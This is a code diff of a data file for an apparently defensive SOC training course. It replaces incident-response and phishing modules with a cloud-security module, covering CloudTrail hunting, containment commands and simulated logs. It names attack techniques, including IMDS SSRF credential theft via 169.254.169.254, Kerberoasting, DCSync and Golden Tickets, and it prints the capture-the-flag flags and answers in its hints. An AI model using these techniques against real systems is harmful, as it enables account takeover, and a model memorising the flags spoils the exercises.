-          "Phase 2: Detection & Analysis (Continuous triage, scoping incident boundaries, determining severity).",
-          "Phase 3: Containment, Eradication & Recovery (Host isolation, account resets, malware removal, system restoration).",
-          "Phase 4: Post-Incident Activity (Lessons Learned, forensic post-mortem, metrics review)."
+          "In the Cloud, Identity is the new perimeter: IAM roles, service accounts, and API tokens replace physical network boundaries.",
+          "Shared Responsibility Model: Cloud Provider secures the cloud infrastructure; the Customer secures identity, configurations, workloads, and data.",
+          "Core Telemetry: AWS CloudTrail (management & data events), Amazon GuardDuty, Azure Activity Logs, and Google Cloud Audit Logs."
         ],
         diagram: `
  ┌────────────────────────────────────────────────────────┐
- │                    1. PREPARATION                      │
+ │              CLOUD TELEMETRY INGESTION                 │
+ ├────────────────────────────────────────────────────────┤
+ │ AWS CloudTrail / VPC Flow Logs / GuardDuty             │
+ │ Azure Monitor / Entra ID / Microsoft Sentinel          │
+ │ Google Cloud Audit Logs / Security Command Center      │
  └──────────────────────────┬─────────────────────────────┘
                             ▼
- ┌────────────────────────────────────────────────────────┐
- │               2. DETECTION & ANALYSIS                  │
- └──────────────────────────┬─────────────────────────────┘
-                            ▼
- ┌────────────────────────────────────────────────────────┐
- │       3. CONTAINMENT, ERADICATION & RECOVERY           │
- └──────────────────────────┬─────────────────────────────┘
-                            ▼
- ┌────────────────────────────────────────────────────────┐
- │                4. POST-INCIDENT ACTIVITY               │
- └────────────────────────────────────────────────────────┘`
+           [ Enterprise SIEM & Cloud SOAR ]`
       },
       {
         id: 2,
-        title: "Ransomware Emergency Containment Playbook",
-        subtitle: "Actions in the First 10 Minutes of Outbreak",
+        title: "Top Cloud Attack Vectors",
+        subtitle: "From Compromised Access Keys to Total Account Takeover",
         bullets: [
-          "Minute 0-2: Sever the Network — Isolate infected host via EDR network containment or physical cable disconnect. DO NOT power off (preserves RAM!).",
-          "Minute 2-5: Scope Lateral Infection — Check Active Directory for mass kerberoasting or anomalous SMB writes across network file shares.",
-          "Minute 5-7: Kill Active Process & Revoke Credentials — Suspend malicious PID, reset compromised Domain Admin tokens.",
-          "Minute 7-10: Block C2 & External Communications — Apply immediate firewall blackholes and DNS RPZ blocks."
-        ],
-        diagram: `
- [ RANSOMWARE DETECTED ] ➔ [ ISOLATE HOST (EDR) ] ➔ [ DO NOT SHUT DOWN (Preserve RAM) ]
-                                    │
- [ Reset Compromised AD Account ] <─┴─> [ Blackhole C2 IP on Perimeter Firewall ]`
+          "Compromised Credentials: API access keys leaked on GitHub or hardcoded into Docker images.",
+          "Privilege Escalation: Exploiting permissive IAM policies (`iam:AttachUserPolicy`, `iam:PassRole`, `sts:AssumeRole`).",
+          "Public Storage Exposure: S3 buckets or Azure Blob Storage misconfigured with public read/write permissions.",
+          "Instance Metadata Service (IMDS) SSRF: Stealing temporary instance credentials via `http://169.254.169.254`."
+        ]
       },
       {
         id: 3,
-        title: "Phishing Email Header Forensics",
-        subtitle: "Unmasking Spoofed Senders in MIME Headers",
+        title: "Hunting Anomalous Cloud Actions",
+        subtitle: "Key CloudTrail Events Every SOC Analyst Monitors",
         bullets: [
-          "Look at the `Received:` headers from bottom to top (bottom-most is the originating sending server).",
-          "`Authentication-Results`: Check SPF (Sender Policy Framework), DKIM (DomainKeys Identified Mail), and DMARC passes or fails.",
-          "`Reply-To`: Often differs from the display name to redirect victim responses to the attacker inbox.",
-          "Attachment Triage: Check hash on VirusTotal, inspect macros in `.docm` or `.xlsm` using `olevba`."
+          "`ConsoleLoginWithoutMFA`: Management console access without multi-factor authentication.",
+          "`CreateAccessKey` / `CreateLoginProfile`: Attacker establishing persistent backdoor access.",
+          "`StopLogging` / `DeleteTrail`: Anti-forensics attempt to blind SOC monitoring.",
+          "`AuthorizeSecurityGroupIngress`: Opening 0.0.0.0/0 to SSH (Port 22) or RDP (Port 3389)."
         ]
       }
     ],
 
     theory: {
-      overview: "When active intrusion occurs, seconds matter. Here are the playbooks utilized by Tier 2 and Tier 3 Incident Responders.",
+      overview: "Cloud security operations require mastery over API-driven architecture, IAM permissions, and centralized cloud audit streams.",
       sections: [
         {
-          heading: "1. Critical Containment Commands",
-          content: "Use these operational commands to sever attacker control on Windows hosts:",
-          codeBlock: `# 1. Emergency Host Isolation (Windows Firewall block all except management)
-netsh advfirewall set allprofiles state on
-netsh advfirewall firewall add rule name="EMERGENCY_ISOLATE" dir=out action=block
-netsh advfirewall firewall add rule name="EMERGENCY_ISOLATE_IN" dir=in action=block
+          heading: "1. Critical CloudTrail Investigation Commands",
+          content: "Use AWS CLI or SIEM queries to investigate compromised IAM keys:",
+          codeBlock: `# 1. Search for root account activity
+aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=root
 
-# 2. Kill Malicious Process Tree
-taskkill /F /PID [MALICIOUS_PID] /T
+# 2. Check for newly attached Administrator policies
+aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AttachUserPolicy
 
-# 3. Disable Compromised Active Directory Account
-Disable-ADAccount -Identity "CompromisedUser"
-
-# 4. Dump RAM for Forensics using WinPmem
-winpmem.exe -o C:\\Forensics\\mem_dump.raw`
+# 3. List recent security group rule modifications
+aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AuthorizeSecurityGroupIngress`
         }
       ]
     },
 
     lab: {
-      title: "Interactive Phishing Email Header Analyzer",
-      scenario: "A finance employee reported an email claiming to be from the CEO demanding urgent wire transfer. Review the raw email headers to identify the real sender IP and phishing attachment.",
-      type: "email-header-sim",
-      rawHeaders: `From: "CEO John Miller" <john.miller@ceo-corporate.com>
-To: sarah.connor@corp.local
-Subject: URGENT: Wire Transfer Invoice Attached
-Date: Thu, 26 Nov 2026 04:12:10 +0000
-Return-Path: <attacker@spoofed-phish-domain.xyz>
-Received: from mail.spoofed-phish-domain.xyz (mail.spoofed-phish-domain.xyz [198.51.100.77])
-    by mail.corp.local with ESMTP id a91k28fa;
-Authentication-Results: mail.corp.local;
-    spf=fail (sender IP 198.51.100.77 is not permitted)
-    dmarc=fail (p=reject)
-Attachment: Invoice_November_2026.pdf.exe
-SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`,
-      taskInstructions: "1. Inspect the Authentication-Results: SPF and DMARC failed.\n2. Note the originating IP address: 198.51.100.77.\n3. Identify the double extension in the attachment: 'Invoice_November_2026.pdf.exe'."
-    },
-
-    challenge: {
-      question: "What is the true originating IP address of the attacker mail server that sent the spoofed email?",
-      targetKey: "198.51.100.77",
-      flag: "flag{ph1sh1ng_c0nta1nm3nt_succ3ss}",
-      hint: "Look at the Received header and Authentication-Results: sender IP is 198.51.100.77. The flag is flag{ph1sh1ng_c0nta1nm3nt_succ3ss}",
-      points: 150
-    }
+      title: "Interactive AWS CloudTrail Log Analyzer",
+      scenario: "GuardDuty alerted on an anomalous IAM policy attachment from an external Tor exit node IP. Inspect the CloudTrail JSON event log below to identify the compromised IAM user account.",
+      type: "cloud-sim",
+      cloudTrailEvent: `{
+  "eventVersion": "1.08",
+  "userIdentity": {
+    "type": "IAMUser",
+    "principalId": "AIDAJ456EXAMPLE",
+    "arn": "arn:aws:iam::123456789012:user/dev-deploy-key",
+    "accountId": "123456789012",
+    "accessKeyId": "AKIAIOSFODNN7EXAMPLE",
+    "userName": "dev-deploy-key"
   },
-
-  {
-    id: "soc-mod-08",
-    slug: "capstone-cyber-range-simulation",
-    moduleNumber: "08",
-    title: "Capstone Red vs Blue Cyber Range Simulation",
-    category: "ir",
-    categoryLabel: "Incident Response",
-    status: "locked",
-    progress: 0,
-    difficulty: "Expert",
-    duration: "4 Hours",
-    slideCount: 16,
-    labCount: "5 Enterprise Range Drills",
-    tags: ["4-Hour Live Fire", "Active Directory", "Exec Briefing"],
-    summary: "4-hour live hostile assault against an enterprise Active Directory domain: defend against Kerberos ticket forgery and deliver executive threat briefings.",
-
-    slides: [
-      {
-        id: 1,
-        title: "The Enterprise Cyber Range Battlefield",
-        subtitle: "Full-Spectrum Red Team Emulation Defense",
-        bullets: [
-          "The capstone exercise mirrors an unannounced APT adversary targeting a hybrid enterprise Active Directory environment.",
-          "Target Assets: Primary Domain Controller (`DC01.ACME.CORP`), Internal Certificate Authority (ADCS), and Financial Database Cluster.",
-          "Red Team Arsenal: BloodHound path discovery, Kerberoasting, AS-REP Roasting, Golden/Silver Ticket forgery, and DCSync replication."
-        ],
-        diagram: `
- ┌────────────────────────────────────────────────────────┐
- │              ENTERPRISE CYBER RANGE HUD                │
- ├────────────────────────────────────────────────────────┤
- │ Perimeter: 2 Edge Firewalls + Cloud Proxy              │
- │ Internal: 1 Forest, 2 Trees, 450 Virtualized Endpoints  │
- │ Defense Team: Lead SOC Analyst + IR Engineers          │
- └────────────────────────────────────────────────────────┘`
-      },
-      {
-        id: 2,
-        title: "Active Directory Identity Attacks",
-        subtitle: "Kerberoasting, DCSync & Golden Tickets",
-        bullets: [
-          "Kerberoasting (T1558.003): Requesting TGS service tickets for SPNs and cracking hashes offline.",
-          "DCSync (T1003.006): Simulating domain replication via `GetNCChanges` to steal all NTLM password hashes without executing code on the DC.",
-          "Golden Ticket (T1558.001): Forging a Kerberos Ticket Granting Ticket (TGT) using the `krbtgt` account NTLM hash, granting god-mode domain access.",
-          "Mitigation: Enforce AES Kerberos encryption, reset `krbtgt` password twice yearly, and monitor Event ID 4662 (Access to DS-Replication-Get-Changes-All)."
-        ]
-      }
-    ],
-
-    theory: {
-      overview: "The capstone puts all skills together: network monitoring, Sysmon process hunting, Splunk query tuning, threat intelligence attribution, and incident containment.",
-      sections: [
-        {
-          heading: "1. Capstone Attack Reconstruction",
-          content: "Correlate telemetry across Windows Security Log Event IDs:",
-          table: {
-            headers: ["Event ID", "Meaning", "Adversary Technique"],
-            rows: [
-              ["4768", "Kerberos TGT requested", "Authentication Ticket Request"],
-              ["4769", "Kerberos Service Ticket (TGS) requested", "Kerberoasting (Check for RC4-HMAC encryption type 0x17)"],
-              ["4672", "Special privileges assigned to new logon", "Privilege Escalation to Domain Admin"],
-              ["4662", "Operation performed on Active Directory object", "DCSync attack against Domain Root"]
-            ]
-          }
-        }
-      ]
-    },
-
-    lab: {
-      title: "Interactive Active Directory Defense Simulator",
-      scenario: "During the live capstone assault, alerts indicate an unauthorized replication request against the primary Domain Controller. Identify the compromised service account used to launch the DCSync command.",
-      type: "ad-defense-sim",
-      logs: [
-        { time: "05:12:01", id: 4769, service: "krbtgt", account: "svc_backup@ACME.CORP", ip: "10.0.10.88", ticketOptions: "0x40810010", encType: "0x17 (RC4)" },
-        { time: "05:14:22", id: 4662, object: "CN=Configuration,DC=ACME,DC=CORP", account: "svc_backup@ACME.CORP", accessMask: "0x100", extendedRight: "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)" },
-        { time: "05:15:00", id: 4624, account: "Administrator", ip: "10.0.10.88", logonType: 3, note: "Golden Ticket Used" }
-      ],
-      taskInstructions: "1. Notice Event ID 4662 indicating DS-Replication-Get-Changes-All.\n2. Note the account executing the DCSync: 'svc_backup@ACME.CORP'.\n3. This account must be locked immediately to sever attacker persistence."
+  "eventTime": "2026-11-26T21:12:00Z",
+  "eventSource": "iam.amazonaws.com",
+  "eventName": "AttachUserPolicy",
+  "awsRegion": "us-east-1",
+  "sourceIPAddress": "198.51.100.89",
+  "userAgent": "aws-cli/2.15.0 Python/3.11.4",
+  "requestParameters": {
+    "userName": "dev-deploy-key",
+    "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+  },
+  "responseElements": null
+}`,
+      taskInstructions: "1. Examine the userIdentity and requestParameters.\n2. Note the userName: 'dev-deploy-key'.\n3. Confirm that AdministratorAccess was attached from IP 198.51.100.89."
     },
 
     challenge: {
-      question: "Which compromised Active Directory account executed the unauthorized DCSync replication request in the capstone range?",
-      targetKey: "svc_backup@ACME.CORP",
-      flag: "flag{c4pst0n3_d0m41n_d3f3nd3d}",
-      hint: "Look at Event ID 4662: account is 'svc_backup@ACME.CORP'. The flag is flag{c4pst0n3_d0m41n_d3f3nd3d}",
-      points: 200
+      question: "What is the compromised AWS IAM user account name that attached AdministratorAccess to itself in the CloudTrail log?",
+      targetKey: "dev-deploy-key",
+      flag: "flag{cl0ud_1am_pr1v_3sc_d3t3ct3d}",
+      hint: "Look at the userName inside userIdentity and requestParameters: 'dev-deploy-key'. The flag is flag{cl0ud_1am_pr1v_3sc_d3t3ct3d}",
+      points: 150
     }
   }
 ];
